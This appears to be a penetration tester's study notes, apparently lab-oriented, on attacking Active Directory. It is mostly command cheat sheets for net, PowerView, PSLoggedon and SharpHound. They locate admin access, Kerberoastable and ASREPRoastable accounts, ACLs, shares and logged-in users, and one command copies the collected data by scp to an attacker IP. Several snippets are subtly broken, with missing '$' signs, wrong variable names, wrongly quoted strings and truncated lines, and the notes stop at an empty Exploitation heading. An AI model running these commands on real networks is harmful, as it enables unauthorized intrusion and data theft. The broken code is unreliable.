# Active Directory - Enumeration

### Manual Enumeration

For any domain it is important to run the `Get-LocalAdminAcces` command that can be imported form the PowerView.ps1 module. This tells you if the current user has admin privs on any of the other systems on the domain. (Remember to check for each forest.)

1. Creating Awareness About AD Environment:
```PowerShell
net user /domain
net group /domain
net group 'Group Name' /domain # gets members of the groups
net user 'User Name' /domain # gets user information with respect to domain
```

2. Getting the Distinguished Name (DN), Primary Domain Controller (PDC) & Domain Component (DC):
```PowerShell
# script to get the domain object
$domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
# get the pdc from the object
$PDC = domainObject.PdcRoleOwner.Name
# prints out the primary DC name (example - DC1.corp.com)
```

3. Getting the Full Distinguished Name:
```PowerShell
# continued from top...
$distinguishedName = ([adsi]'').distinguishedName
```

4. Assembling the Full LDAP Path:
```PowerShell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name;

$DN = ([adsi] '').distinguishedName;
$LDAP_Path = 'LDAP://$PDC/DN'
$LDAP

# Output example:
# LDAP://DC1.corp.com/DC=corp,DC=com
```

---

### Enumeration with PowerView

1. Import the PowerView Module:
```PowerShell
Import-Module '.\PowerView.ps1'
# -- OR --
. '.\PowerView.ps1'
```

2. Different PowerView Modules:
```PowerShell
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
# -- Select Statement to filter --
Get-NetComputer | Select operatingsystem, name, distinguishedname
# selest these >> operatingsystemversion, name, dnshostname

# -- this can be done with any of the properties --
```

---

### PowerView Guide (Internet)
1. **Basic Information**

```PowerShell

# Basic Domain Information
Get-NetDomain

# User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired
Get-NetUser -SPN

# Groups Information
Get-NetGroup | select samaccountname,description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName

# Computers Information
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname 
Get-NetComputer -TrustedToAuth | select samaccountname
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*

```
---
2. **Domain Information**
```PowerShell
# Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID
​
# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
​
# Domain Controller
Get-NetDomainController -Domain mydomain.local #Get Domain Controller

```
---
3. **Users, Groups & Computers**
```PowerShell
# Users
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select -ExpandProperty samaccountname #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
​
# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth #Useful for Kerberos constrain delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation

# Groups
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-NetGPOGroup #Get restricted groups
​
# Computers
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*
```
---
`REFERENCES = https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/`

---
4. **User Admin-Privs on Other Systems**
```PowerShell
Import-Module .\PowerView.ps1
Find-LocalAdminAccess
# Check if current user has admin access on any other computers on the domain

Get-NetSession -ComputerName "CLIENT74" -Verbose
# Check the network for logged in users


```

### Using PSLoggedon.exe
1. Used to see who else is logged-in to other systems on the domain
```PowerShell
.\PSLoggedon.exe \\files04 # hostname or computername or IP Address
```

2. Using PowerShell ✨Magic
```PowerShell
# array declaration using the @() syntax
$computers = @("DC1", "files04", "web04", "client74", "client75", "client76");
foreach ($computer in $computers) {
.\PSLoggedon.exe \\$computer;
Write-Host "=======================================" # separator
}
```

PSLogged relies on the Remote Registry service to run. Which is generally not enabled by default.

---
### Service Principal Names
**Check This Section Later - Understood only partly.**

---

### Enumerating Object Permissions
```text
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

1. With PowerView
```PowerShell
Get-ObjectACl -Identity "sparsh" # ID can be username, groupname, etc.
# interesting filters >> ObjectSid, SecurityIdentifier, ActiveDirectoryRights
```

2. Convert SIDs to Names with `Convert-SidToName`
```PowerShell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```

3. Filtering Output:
In powershell, the "?" is an if statement like python.
```PowerShell
Get-ObjectAcl -Identiy "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | Select ActiveDirectoryRights, SecurityIdentifier
```

---

### Enumerating Domain Shares
1. Shares can be enumerated using PowerView's `Find-DomainShare` cmdlet.
```PowerShell
. .\PowerView.ps1
Find-DomainShare # huge output
Find-DomainShare -CheckShareAccess # filter to show accessible by us.
```

The "SYSVOL" share usually contains configs & scripts that usually belong to the DomainController in the AD. By default, this share is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name`.

From the attack machine, we need smbclient to enumerate. However, with RDP, we can use the following commandsL

2. Listing the shares
```PowerShell

ls \\dc1.corp.com\sysvol\corp.com
# output
    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts

# list the contents of a directory
ls \\dc1.corp.com\sysvol\corp.com\Policies
# continue further enumeration similarly. use cat & the path to see a file.
```

---

### Bloodhound | Sharphound - Automated AD Enumeration

1. Getting Started
Transfer the `Sharphound.ps1` file to the victim & then import it.
```PowerShell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\hutgrabber\Desktop\ -OutputPrefix "hutgrabber"

```

2. Start Neo4j On Local System
```bash
sudo neo4j start
```

3. SCP the generated ZIP File
```bash
scp -r .\bloodhound.zip hutgrabber@192.168.45.222:/home/hutgrabber/
# remove -r if you don’t want to recurse
```

---

# Active Directory - Exploitation

### 